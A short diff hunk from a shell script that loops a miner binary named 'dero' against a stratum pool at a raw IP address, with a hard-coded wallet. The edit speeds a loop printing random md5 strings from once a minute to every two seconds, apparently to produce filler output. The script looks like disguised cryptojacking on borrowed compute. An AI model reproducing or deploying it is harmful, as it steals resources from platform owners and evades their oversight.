@@ -4,6 +4,6 @@ while [ 1 ]; do
 ./dero -a minotaurx -o stratum+tcps://178.62.199.36:80 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO
 done
 while [ 1 ]; do
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
 sleep 2
 done
